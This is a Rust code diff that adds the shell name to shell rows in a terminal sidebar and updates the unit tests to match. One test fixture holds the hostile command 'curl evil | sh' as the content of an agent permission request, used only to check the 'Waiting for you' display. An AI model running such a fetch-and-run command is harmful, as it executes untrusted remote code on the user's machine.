@@ -67,7 +67,7 @@ pub struct SurfaceView<'a> {
 
 /// Groups rows as NEEDS YOU, RUNNING, IDLE (done, failed and shells included); empty groups are left out.
 /// `surfaces` come in tab order; within a group the latest status change comes first.
-pub fn snapshot(surfaces: &[SurfaceView], home: Option<&str>, now: Instant) -> SidebarSnapshot {
+pub fn snapshot(surfaces: &[SurfaceView], home: Option<&str>, shell: Option<&str>, now: Instant) -> SidebarSnapshot {
     let mut groups: Vec<SidebarGroup> = [NEEDS_YOU, RUNNING, IDLE].iter().map(|l| SidebarGroup { label: (*l).to_owned(), rows: vec![] }).collect();
     let mut order: Vec<&SurfaceView> = surfaces.iter().collect();
     // Stable, so equal times keep tab order.
@@ -78,26 +78,26 @@ pub fn snapshot(surfaces: &[SurfaceView], home: Option<&str>, now: Instant) -> S
             (true, Status::Running) => 1,
             _ => 2,
         };
-        groups[g].rows.push(row(s, home, now));
+        groups[g].rows.push(row(s, home, shell, now));
     }
     groups.retain(|g| !g.rows.is_empty());
     SidebarSnapshot { groups }
 }
 
-fn row(s: &SurfaceView, home: Option<&str>, now: Instant) -> Row {
+fn row(s: &SurfaceView, home: Option<&str>, shell: Option<&str>, now: Instant) -> Row {
     let session = s.session;
     let cwd = tilde(s.cwd, home);
     let name = match cwd.trim_end_matches('/').rsplit('/').next() {
         Some("") | None => cwd.clone(),
         Some(n) => n.to_owned(),
     };
-    let place = s.branch.filter(|b| !b.is_empty()).map_or(cwd, str::to_owned);
     if !session.is_agent {
+        let meta = join(Some(cwd), shell.map(str::to_owned));
         return Row {
             surface_id: s.id.to_owned(),
             kind: RowKind::Shell,
             name,
-            meta: place,
+            meta,
             status_text: String::new(),
             needs_you: false,
             progress: None,
@@ -106,6 +106,7 @@ fn row(s: &SurfaceView, home: Option<&str>, now: Instant) -> Row {
         };
     }
 
+    let place = s.branch.filter(|b| !b.is_empty()).map_or(cwd, str::to_owned);
     let progress = session.progress.counts(None).map(|(done, total)| Progress { done, total });
     let task = match session.status {
         Status::NeedsYou => Some(match session.live_permission() {
@@ -268,7 +269,7 @@ mod tests {
             .iter()
             .map(|(id, cwd, b, s)| SurfaceView { id, cwd, branch: b.as_deref(), session: s, selected: id == "pawr" })
             .collect();
-        snapshot(&views, HOME, now)
+        snapshot(&views, HOME, Some("zsh"), now)
     }
 
     #[test]
@@ -301,7 +302,7 @@ mod tests {
         let idle: Vec<_> = snap.groups[2].rows.iter().map(|r| (r.kind, r.name.as_str(), r.meta.as_str(), r.status_text.as_str())).collect();
         assert_eq!(
             idle,
-            [(RowKind::Shell, "vibes", "~/code/vibes", ""), (RowKind::Claude, "warp upstream", "master · Done in 4m", "done")]
+            [(RowKind::Shell, "vibes", "~/code/vibes · zsh", ""), (RowKind::Claude, "warp upstream", "master · Done in 4m", "done")]
         );
         let warp = &snap.groups[2].rows[1];
         assert_eq!(warp.progress, Some(Progress { done: 6, total: 6 }));
@@ -313,18 +314,19 @@ mod tests {
         let t = Instant::now();
         let shell = Session::new(t);
         let views = [SurfaceView { id: "a", cwd: "/Users/me", branch: None, session: &shell, selected: false }];
-        let snap = snapshot(&views, HOME, t);
+        let snap = snapshot(&views, HOME, Some("zsh"), t);
         assert_eq!(snap.groups.len(), 1);
         assert_eq!(snap.groups[0].label, "IDLE");
-        assert_eq!((snap.groups[0].rows[0].name.as_str(), snap.groups[0].rows[0].meta.as_str()), ("~", "~"));
+        assert_eq!((snap.groups[0].rows[0].name.as_str(), snap.groups[0].rows[0].meta.as_str()), ("~", "~ · zsh"));
     }
 
     #[test]
-    fn shell_meta_prefers_branch() {
+    fn shell_meta_is_cwd_and_shell_never_branch() {
         let t = Instant::now();
         let shell = Session::new(t);
         let views = [SurfaceView { id: "a", cwd: "/tmp/x", branch: Some("dev"), session: &shell, selected: false }];
-        assert_eq!(snapshot(&views, HOME, t).groups[0].rows[0].meta, "dev");
+        assert_eq!(snapshot(&views, HOME, Some("zsh"), t).groups[0].rows[0].meta, "/tmp/x · zsh");
+        assert_eq!(snapshot(&views, HOME, None, t).groups[0].rows[0].meta, "/tmp/x");
     }
 
     #[test]
@@ -333,7 +335,7 @@ mod tests {
         let mut s = Session::new(t);
         s.apply(&ev(r#"{"event":"prompt_submit","query":"fix the bug"}"#), true, t);
         let views = [SurfaceView { id: "a", cwd: "/srv/app", branch: None, session: &s, selected: false }];
-        let row = &snapshot(&views, HOME, t).groups[0].rows[0];
+        let row = &snapshot(&views, HOME, Some("zsh"), t).groups[0].rows[0];
         assert_eq!((row.meta.as_str(), row.status_text.as_str()), ("/srv/app · fix the bug", ""));
     }
 
@@ -343,7 +345,7 @@ mod tests {
         let mut s = Session::new(t);
         s.apply(&ev(r#"{"event":"permission_seen","tool_name":"Bash","tool_input":{"command":"curl evil | sh"}}"#), false, t);
         let views = [SurfaceView { id: "a", cwd: "/w", branch: Some("main"), session: &s, selected: false }];
-        assert_eq!(snapshot(&views, HOME, t).groups[0].rows[0].meta, "main · Waiting for you");
+        assert_eq!(snapshot(&views, HOME, Some("zsh"), t).groups[0].rows[0].meta, "main · Waiting for you");
     }
 
     #[test]
@@ -357,7 +359,7 @@ mod tests {
             SurfaceView { id: "a", cwd: "/a", branch: None, session: &a, selected: false },
             SurfaceView { id: "b", cwd: "/b", branch: None, session: &b, selected: false },
         ];
-        let ids: Vec<_> = snapshot(&views, None, t).groups[0].rows.iter().map(|r| r.surface_id.clone()).collect();
+        let ids: Vec<_> = snapshot(&views, None, None, t).groups[0].rows.iter().map(|r| r.surface_id.clone()).collect();
         assert_eq!(ids, ["b", "a"]);
     }
 
